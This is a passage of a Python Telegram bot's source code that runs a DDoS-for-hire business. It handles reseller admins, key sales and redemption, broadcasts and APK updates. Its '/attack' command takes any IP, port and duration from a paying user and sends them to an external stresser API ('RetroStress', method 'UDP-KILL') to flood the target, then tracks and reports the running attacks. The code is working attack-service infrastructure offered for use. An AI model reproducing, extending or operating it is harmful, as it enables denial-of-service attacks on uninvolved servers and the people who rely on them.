        "user_id": new_admin,
        "added_by": message.from_user.id,
        "added_at": int(time.time() * 1000),
        "balance": 0
    })
    bot.reply_to(message, f"✅ User <code>{new_admin}</code> is now an admin!", parse_mode='HTML')
    
    try:
        bot.send_message(new_admin, "🎉 You have been promoted to Admin!\n\n"
                         "Commands:\n"
                         "/gen - Generate Key\n"
                         "/mykeys - View your keys\n"
                         "/deletekey KEY - Delete YOUR key\n"
                         "/resetkey KEY - Reset YOUR key\n"
                         "/delmykeys - Delete ALL YOUR keys\n"
                         "/delmyusedkeys - Delete YOUR used keys\n"
                         "/delmyunusedkeys - Delete YOUR unused keys")
    except:
        pass

@bot.message_handler(commands=['setbalance'])
def set_balance(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /setbalance USER_ID AMOUNT")
            return
        
        target_user = int(parts[1])
        amount = int(parts[2])
        
        if not admins_collection.find_one({"user_id": target_user}):
            bot.reply_to(message, f"❌ User <code>{target_user}</code> is not an admin!", parse_mode='HTML')
            return
            
        admins_collection.update_one(
            {"user_id": target_user},
            {"$set": {"balance": amount}}
        )
        
        bot.reply_to(message, f"✅ Balance set to <b>{amount}</b> for user <code>{target_user}</code>!", parse_mode='HTML')
        
        try:
            bot.send_message(target_user, f"💰 Your balance has been updated to: <b>{amount}</b>", parse_mode='HTML')
        except:
            pass
            
    except ValueError:
        bot.reply_to(message, "❌ Invalid input! Please enter valid numbers.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['setbrand'])
def set_brand_message(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
        
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        help_text = (
            "📝 **How to set your Custom Brand Message:**\n\n"
            "Use: `/setbrand <your message>`\n\n"
            "**Example:**\n"
            "`/setbrand 🔥 Powered by Mods! Join t.me/ApexMods for deals! 🔥`\n\n"
            "**How it works:**\n"
            "When users redeem keys generated by you, they will see this message at the bottom.\n\n"
            "To view your current brand message, use `/viewbrand`."
        )
        bot.reply_to(message, help_text, parse_mode="Markdown")
        return
        
    brand_msg = parts[1]
    if len(brand_msg) > 200:
        bot.reply_to(message, "❌ Brand message too long! Max 200 characters.")
        return
        
    admins_collection.update_one(
        {"user_id": user_id},
        {"$set": {"brand_message": brand_msg}},
        upsert=True
    )
    bot.reply_to(message, f"✅ **Brand Message Set Successfully!**\n\nYour message:\n`{brand_msg}`", parse_mode="Markdown")

@bot.message_handler(commands=['viewbrand'])
def view_brand_message(message):
    user_id = message.from_user.id
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Unauthorized")
        return
        
    admin_data = admins_collection.find_one({"user_id": user_id})
    brand_msg = admin_data.get('brand_message', "No brand message set.") if admin_data else "No brand message set."
    bot.reply_to(message, f"📋 **Your Current Brand Message:**\n\n`{brand_msg}`", parse_mode="Markdown")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    
    try:
        admin_to_remove = int(message.text.split()[1])
    except:
        bot.reply_to(message, "Usage: /removeadmin USER_ID")
        return
    
    if admin_to_remove == OWNER_ID:
        bot.reply_to(message, "❌ Cannot remove owner.")
        return
    
    result = admins_collection.delete_one({"user_id": admin_to_remove})
    if result.deleted_count > 0:
        # Also delete keys generated by this admin
        deleted_keys = keys_collection.delete_many({"generated_by": admin_to_remove})
        
        bot.reply_to(message, 
            f"✅ User <code>{admin_to_remove}</code> is no longer an admin.\n"
            f"🗑️ <b>{deleted_keys.deleted_count}</b> keys generated by this admin have been deleted.", 
            parse_mode='HTML')
    else:
        bot.reply_to(message, f"User <code>{admin_to_remove}</code> is not an admin.", parse_mode='HTML')

@bot.message_handler(commands=['admins'])
def list_admins(message):
    if not is_owner(message.from_user.id):
        bot.reply_to(message, "❌ Owner only command.")
        return
    
    admins = list(admins_collection.find({"user_id": {"$ne": OWNER_ID}}).sort("added_at", -1))
    
    if not admins:
        bot.reply_to(message, "No admins found.")
        return
    
    response = "👥 <b>Admin List:</b>\n\n"
    response += f"👑 OWNER: <code>{OWNER_ID}</code>\n\n"
    
    for admin in admins:
        admin_id = admin.get('user_id')
        added_by = admin.get('added_by')
        added_at = admin.get('added_at', 0)
        added_time = datetime.fromtimestamp(added_at / 1000).strftime("%Y-%m-%d %H:%M:%S")
        balance = admin.get('balance', 0)
        
        name = "Unknown"
        username = "N/A"
        try:
            chat = bot.get_chat(admin_id)
            name = chat.first_name or "Unknown"
            if chat.last_name:
                name += f" {chat.last_name}"
            username = f"@{chat.username}" if chat.username else "N/A"
        except Exception as e:
            pass # Keep defaults if failed
            
        response += f"• 👤 <b>Name:</b> {name}\n"
        response += f"  🆔 <b>ID:</b> <code>{admin_id}</code>\n"
        response += f"  🏷️ <b>User:</b> {username}\n"
        response += f"  💰 <b>Balance:</b> {balance}\n"
        response += f"  ➕ <b>Added by:</b> <code>{added_by}</code>\n"
        response += f"  📅 <b>Added on:</b> {added_time}\n\n"
    
    bot.reply_to(message, response[:4000], parse_mode='HTML')

# ========== OWNER ONLY: SET MAX DURATION ==========

@bot.message_handler(commands=['setmaxduration'])
def set_max_duration(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            current_max = get_setting("max_duration", 300)
            bot.reply_to(message, f"Usage: /setmaxduration <seconds>\n\n"
                         f"Example: /setmaxduration 300\n"
                         f"Current max duration: **{current_max}** seconds\n"
                         f"⚠️ Max limit: 86400 seconds (24 hours)",
                         parse_mode="Markdown")
            return
        
        max_duration = int(parts[1])
        
        if max_duration < 1:
            bot.reply_to(message, "❌ Max duration must be at least 1 second!")
            return
        
        if max_duration > 86400:
            bot.reply_to(message, "❌ Max duration cannot exceed 86400 seconds (24 hours)!")
            return
        
        old_value = get_setting("max_duration", 300)
        set_setting("max_duration", max_duration, user_id)
        
        bot.reply_to(message, f"✅ Max attack duration has been set to **{max_duration}** seconds!\n\n"
                     f"📊 Previous value: {old_value} seconds\n"
                     f"⚠️ This will affect all new attacks from the API server.",
                     parse_mode="Markdown")
        
    except ValueError:
        bot.reply_to(message, "❌ Please provide a valid number of seconds!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== OWNER ONLY: SET COOLDOWN ==========

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_time(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) != 2:
            current_cooldown = get_setting("cooldown_seconds", 60)
            bot.reply_to(message, f"Usage: /setcooldown <seconds>\n\n"
                         f"Example: /setcooldown 60\n"
                         f"Current cooldown: **{current_cooldown}** seconds\n"
                         f"💡 Use 0 for no cooldown\n"
                         f"⚠️ Max limit: 3600 seconds (1 hour)",
                         parse_mode="Markdown")
            return
        
        cooldown_seconds = int(parts[1])
        
        if cooldown_seconds < 0:
            bot.reply_to(message, "❌ Cooldown cannot be negative! Use 0 for no cooldown.")
            return
        
        if cooldown_seconds > 3600:
            bot.reply_to(message, "❌ Cooldown cannot exceed 3600 seconds (1 hour)!")
            return
        
        old_value = get_setting("cooldown_seconds", 60)
        set_setting("cooldown_seconds", cooldown_seconds, user_id)
        
        cooldown_text = "No cooldown" if cooldown_seconds == 0 else f"{cooldown_seconds} seconds"
        bot.reply_to(message, f"✅ Attack cooldown has been set to **{cooldown_text}**!\n\n"
                     f"📊 Previous value: {old_value} seconds\n"
                     f"⚠️ This will affect all new attacks from the API server.",
                     parse_mode="Markdown")
        
    except ValueError:
        bot.reply_to(message, "❌ Please provide a valid number of seconds!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== OWNER ONLY: VIEW SETTINGS ==========

@bot.message_handler(commands=['viewsettings'])
def view_settings(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    max_duration = get_setting("max_duration", 300)
    cooldown = get_setting("cooldown_seconds", 60)
    
    cooldown_text = "No cooldown" if cooldown == 0 else f"{cooldown} seconds"
    
    max_setting = settings_collection.find_one({"setting_key": "max_duration"})
    cooldown_setting = settings_collection.find_one({"setting_key": "cooldown_seconds"})
    
    response = f"⚙️ **Current Bot Settings**\n\n"
    response += f"🎯 **Max Attack Duration:** {max_duration} seconds\n"
    if max_setting and max_setting.get('updated_by'):
        response += f"   └ Last updated by: `{max_setting['updated_by']}`\n"
        if max_setting.get('updated_at'):
            updated_time = datetime.fromtimestamp(max_setting['updated_at'] / 1000).strftime("%Y-%m-%d %H:%M:%S")
            response += f"   └ Updated on: {updated_time}\n"
    
    response += f"\n⏰ **Attack Cooldown:** {cooldown_text}\n"
    if cooldown_setting and cooldown_setting.get('updated_by'):
        response += f"   └ Last updated by: `{cooldown_setting['updated_by']}`\n"
        if cooldown_setting.get('updated_at'):
            updated_time = datetime.fromtimestamp(cooldown_setting['updated_at'] / 1000).strftime("%Y-%m-%d %H:%M:%S")
            response += f"   └ Updated on: {updated_time}\n"
    
    response += f"\n💡 **Note:** Changes take effect immediately for all new attacks."
    
    bot.reply_to(message, response, parse_mode="Markdown")

# ========== OWNER ONLY: GET SERVER IP ==========

@bot.message_handler(commands=['ip'])
def ip_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    server_ip = get_server_ip()
    response = (
        f"🖥️ **Server Information**\n\n"
        f"📍 **IP Address:** `{server_ip}`\n"
        f"✅ **Status:** Online\n"
        f"👑 **Owner:** `{OWNER_ID}`\n"
        f"🕐 **IST Time:** {format_expiry_ist(int(time.time() * 1000))}\n\n"
        f"💡 This is the public IP address of the server."
    )
    
    bot.reply_to(message, response, parse_mode="Markdown")

# ========== BROADCAST TO ALL USERS (OWNER ONLY) ==========

@bot.message_handler(commands=['broadcast'])
def broadcast_to_all(message):
    user_id = message.from_user.id
    
    # Check if user is owner
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    
    # Check if message has text after /broadcast
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "❌ Usage: /broadcast <message>\n\nExample: /broadcast Server will be down for maintenance.")
        return
    
    broadcast_msg = parts[1]
    
    # Get all unique users from different collections
    all_user_ids = set()
    
    # 1. Add all admins
    for admin in admins_collection.find({}, {"user_id": 1}):
        if "user_id" in admin and admin["user_id"]:
            all_user_ids.add(admin["user_id"])
            
    # 2. Add all users who have redeemed keys
    for key in keys_collection.find({"is_redeemed": 1}, {"redeemed_by": 1}):
        if "redeemed_by" in key and key["redeemed_by"]:
            all_user_ids.add(key["redeemed_by"])
            
    # 3. Add all users who have ever launched an attack
    for attack in db.bot_attacks.find({}, {"user_id": 1}):
        if "user_id" in attack and attack["user_id"]:
            all_user_ids.add(attack["user_id"])
            
    # 4. Also add owner
    all_user_ids.add(OWNER_ID)
    
    user_ids = list(all_user_ids)
    
    if not user_ids:
        bot.reply_to(message, "❌ No users found in database.")
        return
    
    success_count = 0
    fail_count = 0
    
    status_msg = bot.reply_to(message, f"📢 Broadcasting to {len(user_ids)} users...")
    
    for uid in user_ids:
        try:
            bot.send_message(
                uid,
                f"📢 **ANNOUNCEMENT FROM OWNER**\n\n{broadcast_msg}\n\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} IST",
                parse_mode="Markdown"
            )
            success_count += 1
            time.sleep(0.05) # Small delay to avoid hitting Telegram API limits
        except Exception as e:
            # User might have blocked the bot
            fail_count += 1
    
    bot.edit_message_text(
        f"✅ Broadcast Complete!\n\n✅ Sent to: {success_count} users\n❌ Failed: {fail_count} (Blocked/Not started bot)",
        chat_id=message.chat.id,
        message_id=status_msg.message_id
    )

# ========== USER COMMANDS ==========

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "📝 **Usage:** `/redeem <key>`", parse_mode="Markdown")
            return
        
        key = parts[1]
        key_data = keys_collection.find_one({"key": key})
        
        if not key_data:
            bot.reply_to(message, "❌ Key not found!")
            return
        
        if key_data.get('is_active') == 0:
            bot.reply_to(message, "❌ Key has been deleted or is inactive.")
            return
            
        if key_data.get('is_redeemed', 0) == 1:
            bot.reply_to(message, "❌ Key has already been redeemed!")
            return
            
        # Redeem the key
        now = int(time.time() * 1000)
        duration_ms = key_data.get('duration_ms', 0)
        
        if not duration_ms:
            # Fallback for old keys if any
            duration_ms = 0
            
        expiry_at = now + duration_ms
        expiry_readable = format_expiry_ist(expiry_at)
        
        keys_collection.update_one(
            {"key": key},
            {"$set": {
                "is_redeemed": 1,
                "redeemed_by": user_id,
                "redeemed_at": now,
                "expiry_at": expiry_at
            }}
        )
        
        brand_msg = get_brand_message(key_data.get('generated_by'))
        brand_suffix = f"\n\n------------------------------------------------\n📢 **Message from your Reseller:**\n{brand_msg}" if brand_msg else ""
        
        bot.reply_to(message, 
            f"✅ **Key Redeemed Successfully!**\n\n"
            f"🔑 Key: `{key}`\n"
            f"📅 Valid Until: {expiry_readable}\n"
            f"💡 You can now use this key to login in the APK."
            f"{brand_suffix}",
            parse_mode="Markdown")
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== ATTACK COMMAND ==========

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "📝 **Usage:** `/attack <ip> <port> <duration>`", parse_mode="Markdown")
            return
        
        ip = parts[1]
        port = parts[2]
        duration = parts[3]
        
        now = int(time.time() * 1000)
        # Find key redeemed by this user that is still valid
        key_data = keys_collection.find_one({
            "redeemed_by": user_id,
            "is_active": 1,
            "expiry_at": {"$gt": now}
        })
        
        if not key_data:
            # Check if they have an expired key to give a better message
            expired_key = keys_collection.find_one({
                "redeemed_by": user_id,
                "is_active": 1,
                "expiry_at": {"$lte": now}
            })
            if expired_key:
                bot.reply_to(message, "❌ Your key has expired! Redeem a new key.")
            else:
                bot.reply_to(message, "❌ You don't have an active key! Redeem a key first.")
            return
            
        # Check cooldown
        last_attack = db.bot_attacks.find_one({"user_id": user_id}, sort=[("start_time", -1)])
        if last_attack:
            last_start = last_attack.get("start_time", 0)
            last_duration = int(last_attack.get("duration", 0))
            cooldown_end = last_start + (last_duration * 1000) + (40 * 1000)
            
            if now < cooldown_end:
                remaining_cooldown = int((cooldown_end - now) / 1000)
                bot.reply_to(message, f"❌ **Cooldown Active!**\nPlease wait `{remaining_cooldown}s` before starting another attack.", parse_mode="Markdown")
                return
            
        # Validate IP
        parts_ip = ip.split('.')
        if len(parts_ip) != 4:
            bot.reply_to(message, "❌ Invalid IP address!")
            return
        for part in parts_ip:
            if not part.isdigit() or int(part) < 0 or int(part) > 255:
                bot.reply_to(message, "❌ Invalid IP address!")
                return
        
        # Validate port
        try:
            port = int(port)
            if port < 1 or port > 65535:
                bot.reply_to(message, "❌ Port must be 1-65535!")
                return
        except:
            bot.reply_to(message, "❌ Invalid port!")
            return
            
        # Validate duration
        try:
            duration = int(duration)
            max_duration = settings_collection.find_one({"setting_key": "max_duration"})
            max_duration = max_duration.get("setting_value", 300) if max_duration else 300
            if duration < 1 or duration > max_duration:
                bot.reply_to(message, f"❌ Duration must be 1-{max_duration} seconds!")
                return
        except:
            bot.reply_to(message, "❌ Invalid duration!")
            return
            
        # Call RetroStress API
        url = os.getenv("RETROSTRESS_API_URL")
        key = os.getenv("RETROSTRESS_API_KEY")
        
        if not url or not key:
            bot.reply_to(message, "❌ Server configuration error (RetroStress API not set)!")
            return
            
        if "[target]" in url or "[port]" in url or "[time]" in url or "[key]" in url or "[concurrents]" in url:
            url = url.replace("[target]", ip)\
                     .replace("[port]", str(port))\
                     .replace("[time]", str(duration))\
                     .replace("[method]", "UDP-KILL")\
                     .replace("[key]", key if key else "")\
                     .replace("[concurrents]", "1")
            
            # Fallback for old templates
            if "key=0" in url and key:
                url = url.replace("key=0", f"key={key}")
            
            # If key still not in URL and we have a key, append it
            if "key=" not in url and key:
                separator = "&" if "?" in url else "?"
                url += f"{separator}key={key}"
                
            response = requests.get(url, timeout=30)
        else:
            params = {
                "key": key,
                "host": ip,
                "port": port,
                "time": duration,
                "method": "UDP-KILL",
                "concurrent": 1
            }
            response = requests.get(url, params=params, timeout=30)
            
        # Check if response is actually successful
        is_success = False
        api_res_text = response.text[:4000].replace('`', '')
        
        if response.status_code in [200, 201]:
            # Some APIs return 200 even on error, check response body
            # Smart Check for RetroStress:
            res_lower = api_res_text.lower()
            
            # If it contains "successfully" or "success", it's likely a success
            if "success" in res_lower:
                is_success = True
            
            # BUT, if it contains clear error keywords, it's a failure
            # Added "false", "wait", "cooldown" to keywords
            error_keywords = ["error", "denied", "invalid", "limit reached", "balance", "false", "wait", "cooldown"]
            if any(keyword in res_lower for keyword in error_keywords):
                # Exception: If it says "Sent Successfully" but also has some other keyword, 
                # we trust "Successfully" unless it's a cooldown/wait message
                if "success" in res_lower and not any(k in res_lower for k in ["wait", "cooldown", "false"]):
                    is_success = True
                else:
                    is_success = False
        
        if is_success:
            brand_msg = get_brand_message(key_data.get('generated_by'))
            brand_suffix = f"\n\n------------------------------------------------\n📢 **Partner Message:**\n{brand_msg}" if brand_msg else ""
            
            bot.reply_to(message, 
                f"🚀 **Attack Sent Successfully!**\n\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"⏱️ Duration: `{duration}s`\n"
                f"💥 Status: Flooding...\n"
                f"🔔 You will be notified when finished."
                f"{brand_suffix}",
                parse_mode="Markdown")
            
            # Send API response to owner if the attacker is not the owner
            if user_id != OWNER_ID:
                try:
                    # Extract any links from response
                    links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
                    link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
                    
                    bot.send_message(OWNER_ID, 
                        f"ℹ️ **Attack Launched (Bot)**\n"
                        f"👤 User: `{user_id}`\n"
                        f"🎯 Target: `{ip}:{port}`\n"
                        f"⏱️ Duration: `{duration}s`\n"
                        f"📝 API Response: `{api_res_text}`"
                        f"{link_text}", 
                        parse_mode="Markdown")
                except:
                    pass
            
            # Save attack to MongoDB for /active command
            db.bot_attacks.insert_one({
                "user_id": user_id,
                "ip": ip,
                "port": port,
                "duration": duration,
                "start_time": now,
                "expiry": now + (duration * 1000)
            })
            
            # Auto-notification thread
            def notify_user():
                time.sleep(duration)
                try:
                    bot.send_message(user_id, f"🔔 **Attack Finished!**\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}s`", parse_mode="Markdown")
                except:
                    pass
            
            threading.Thread(target=notify_user, daemon=True).start()
            
        else:
            if user_id == OWNER_ID:
                bot.reply_to(message, f"❌ API Error Detected\nStatus: {response.status_code}\nResponse: {api_res_text}")
            else:
                bot.reply_to(message, "❌ Attack failed! API returned an error.")
                try:
                    # Extract any links from response
                    links = re.findall(r'(https?://[^\s<>"]+|www\.[^\s<>"]+)', api_res_text)
                    link_text = "\n🔗 **Links Found:**\n" + "\n".join([f"• {l}" for l in links]) if links else ""
                    
                    bot.send_message(OWNER_ID, 
                        f"🚨 **API Error Alert (Bot)**\n"
                        f"👤 User: `{user_id}`\n"
                        f"🎯 Target: `{ip}:{port}`\n"
                        f"🚫 Status: {response.status_code}\n"
                        f"📝 Response: `{api_res_text}`"
                        f"{link_text}", 
                        parse_mode="Markdown")
                except:
                    pass
            
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== ACTIVE COMMAND ==========

@bot.message_handler(commands=['active'])
def active_command(message):
    user_id = message.from_user.id
    try:
        now = int(time.time() * 1000)
        # Find active attacks for this user
        attacks = list(db.bot_attacks.find({"user_id": user_id, "expiry": {"$gt": now}}))
        
        if not attacks:
            bot.reply_to(message, "❌ You have no active attacks started from the bot.")
            return
            
        response = "🚀 **Your Active Attacks:**\n\n"
        for i, attack in enumerate(attacks, 1):
            remaining = int((attack["expiry"] - now) / 1000)
            response += f"{i}. 🎯 `{attack['ip']}:{attack['port']}`\n   ⏳ Remaining: `{remaining}s`\n\n"
            
        sent_msg = bot.reply_to(message, response, parse_mode="Markdown")
        
        # Start a thread to update the countdown
        def update_countdown():
            try:
                while True:
                    time.sleep(5) # Update every 5 seconds
                    current_now = int(time.time() * 1000)
                    current_attacks = list(db.bot_attacks.find({"user_id": user_id, "expiry": {"$gt": current_now}}))
                    
                    if not current_attacks:
                        try:
                            bot.edit_message_text(
                                "✅ **All attacks finished!**",
                                chat_id=message.chat.id,
                                message_id=sent_msg.message_id,
                                parse_mode="Markdown"
                            )
                        except:
                            pass
                        break
                        
                    new_response = "🚀 **Your Active Attacks:**\n\n"
                    for i, attack in enumerate(current_attacks, 1):
                        remaining = int((attack["expiry"] - current_now) / 1000)
                        new_response += f"{i}. 🎯 `{attack['ip']}:{attack['port']}`\n   ⏳ Remaining: `{remaining}s`\n\n"
                    
                    try:
                        bot.edit_message_text(
                            new_response,
                            chat_id=message.chat.id,
                            message_id=sent_msg.message_id,
                            parse_mode="Markdown"
                        )
                    except Exception as e:
                        if "message is not modified" not in str(e):
                            pass
                            
            except Exception as e:
                print(f"Error in update_countdown: {e}")
                
        threading.Thread(target=update_countdown, daemon=True).start()
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ========== API FUNCTIONS ==========

def verify_key_api(key, user_device_id):
    key_data = keys_collection.find_one({"key": key})
    
    if not key_data:
        return {"valid": False, "reason": "Key not found"}
    
    if not key_data.get('is_redeemed', 0):
        return {"valid": False, "reason": "Key must be redeemed in bot first"}
        
    expiry_ts = key_data.get('expiry_at', 0)
    is_active = key_data.get('is_active', 0)
    device_limit = key_data.get('device_limit', 1)
    now = int(time.time() * 1000)
    
    if is_active == 0:
        return {"valid": False, "reason": "Key has been deleted"}
    
    if expiry_ts < now:
        return {"valid": False, "reason": "Key expired"}
    
    session = active_sessions_collection.find_one({"key": key})
    current_devices = session.get('devices', {}) if session else {}
    
    active_count = len(current_devices) if isinstance(current_devices, dict) else 0
    
    if user_device_id not in current_devices:
        if active_count >= device_limit:
            return {"valid": False, "reason": f"Key has reached maximum device limit ({device_limit})"}
    
    if not session:
        active_sessions_collection.insert_one({
            "key": key,
            "devices": {user_device_id: {"login_time": now, "last_active": now}}
        })
    else:
        devices = session.get('devices', {})
        devices[user_device_id] = {"login_time": now, "last_active": now}
        active_sessions_collection.update_one(
            {"key": key},
            {"$set": {"devices": devices}}
        )
    
    if key_data.get('is_used') == 0:
        keys_collection.update_one(
            {"key": key},
            {"$set": {"is_used": 1, "used_by": user_device_id, "used_at": now}}
        )
    
    return {"valid": True, "expiry": expiry_ts, "expiry_readable": format_expiry_ist(expiry_ts)}

def release_key_session(key, device_id=None):
    session = active_sessions_collection.find_one({"key": key})
    if session:
        if device_id:
            devices = session.get('devices', {})
            if device_id in devices:
                del devices[device_id]
                if devices:
                    active_sessions_collection.update_one(
                        {"key": key},
                        {"$set": {"devices": devices}}
                    )
                else:
                    active_sessions_collection.delete_one({"key": key})
        else:
            active_sessions_collection.delete_one({"key": key})

# ========== OWNER ONLY: UPLOAD NEW APK ==========

@bot.message_handler(commands=['updateapk'])
def update_apk_help(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
    bot.reply_to(message, "❌ Please attach the APK file and use `/updateapk <version_code>` in the caption.\nExample: Send APK file with caption: `/updateapk 2.0`")

@bot.message_handler(content_types=['document'], func=lambda message: message.caption and message.caption.startswith('/updateapk'))
def update_apk_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
        
    # Get version code from caption
    try:
        caption = message.caption or ""
        args = caption.split()
        if len(args) < 2:
            bot.reply_to(message, "❌ Please provide the version code in the caption. Example: `/updateapk 2.0`")
            return
        version_code = args[1]
    except Exception as e:
        bot.reply_to(message, "❌ Error parsing version code.")
        return
        
    # Check if file is an APK
    file_name = message.document.file_name
    if not file_name.endswith('.apk'):
        bot.reply_to(message, "❌ Please upload a valid .apk file.")
        return
        
    bot.reply_to(message, "⏳ Downloading APK...")
    
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        # Create static directory if it doesn't exist
        os.makedirs('static', exist_ok=True)
        
        # Save file
        apk_path = os.path.join('static', 'app-release.apk')
        with open(apk_path, 'wb') as new_file:
            new_file.write(downloaded_file)
            
        # Update database
        settings_collection.update_one(
            {"setting_key": "latest_version"},
            {"$set": {"setting_value": version_code, "updated_at": int(time.time() * 1000)}},
            upsert=True
        )
        
        bot.reply_to(message, f"✅ APK updated successfully!\n📦 Version: {version_code}\n📂 Saved as: {apk_path}")
        
    except Exception as e:
        bot.reply_to(message, f"❌ Failed to update APK: {str(e)}")

# ========== OWNER ONLY: SET UPDATE LINK ==========

@bot.message_handler(commands=['setupdate'])
def set_update_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
        
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "❌ Please provide version and URL. Example: `/setupdate 1.2 https://github.com/.../app.apk`")
        return
        
    version_code = args[1]
    download_url = args[2]
    
    # Update database
    settings_collection.update_one(
        {"setting_key": "latest_version"},
        {"$set": {"setting_value": version_code, "updated_at": int(time.time() * 1000)}},
        upsert=True
    )
    
    settings_collection.update_one(
        {"setting_key": "apk_download_url"},
        {"$set": {"setting_value": download_url, "updated_at": int(time.time() * 1000)}},
        upsert=True
    )
    
    bot.reply_to(message, f"✅ Update info saved!\n📦 Version: {version_code}\n🔗 URL: {download_url}")

# ========== OWNER ONLY: CHECK KEY SESSIONS ==========

@bot.message_handler(commands=['checkkey'])
def check_key_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Owner only command!")
        return
        
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "❌ Please provide the key. Example: `/checkkey KEY`")
        return
        
    key = args[1]
    
    session = active_sessions_collection.find_one({"key": key})
    if not session:
        bot.reply_to(message, "❌ No active session found for this key (No devices logged in).")
        return
        
    devices = session.get('devices', {})
    device_count = len(devices)
    
    response = f"🔑 Key: `{key}`\n"
    response += f"📱 Active Devices: **{device_count}**\n\n"
    
    if device_count > 0:
        response += "📋 Device List:\n"
        for i, (device_id, data) in enumerate(devices.items(), 1):
            login_time = data.get('login_time', 0)
            login_time_str = datetime.fromtimestamp(login_time / 1000).strftime("%Y-%m-%d %H:%M:%S") if login_time else "Unknown"
            response += f"{i}. Device ID: `{device_id[:10]}...` (Logged in: {login_time_str})\n"
            
    bot.reply_to(message, response, parse_mode='Markdown')

# ========== EXPIRY CHECK FUNCTION ==========

def check_expiring_keys():
    while True:
        try:
            now = int(time.time() * 1000)
            one_hour_later = now + (60 * 60 * 1000)
            
            # Find keys expiring in the next 1 hour that haven't been warned yet
            expiring_keys = list(keys_collection.find({
                "is_redeemed": 1,
                "expiry_at": {"$gt": now, "$lt": one_hour_later},
                "expiry_warned": {"$ne": True}
            }))
            
            for key_data in expiring_keys:
                user_id = key_data.get('redeemed_by')
                key = key_data.get('key')
                expiry_at = key_data.get('expiry_at')
                
                remaining_mins = int((expiry_at - now) / (60 * 1000))
                
                try:
                    bot.send_message(user_id, 
                        f"⚠️ **Attention!**\n\n"
                        f"Your key `{key}` is about to expire in `{remaining_mins}` minutes!\n"
                        f"Renew your key soon to continue using the service.",
                        parse_mode="Markdown")
                    
                    # Mark as warned
                    keys_collection.update_one({"key": key}, {"$set": {"expiry_warned": True}})
                except Exception as e:
                    print(f"Failed to send expiry warning to {user_id}: {e}")
                    
        except Exception as e:
            print(f"Error in check_expiring_keys: {e}")
            
        time.sleep(300) # Check every 5 minutes

# ========== STARTUP ==========

server_ip = get_server_ip()
print("=" * 60)
print("🤖 TELEGRAM BOT STARTING...")
print("=" * 60)
print(f"🖥️ Server IP: {server_ip}")
print(f"👑 Owner ID: {OWNER_ID}")
print(f"📦 Database: MongoDB")
print("=" * 60)

# ========== FORCE KILL OTHER INSTANCES ==========
print("🔄 Removing any existing webhooks and terminating other instances...")
try:
    bot.delete_webhook(drop_pending_updates=True)
    print("✅ Webhook cleared successfully!")
except Exception as e:
    print(f"⚠️ Webhook clear warning: {e}")

print("🤖 Telegram Bot Started (MongoDB + Full Key Management)!")

# Start expiry check thread
threading.Thread(target=check_expiring_keys, daemon=True).start()

bot.infinity_polling(skip_pending=True, restart_on_change=False)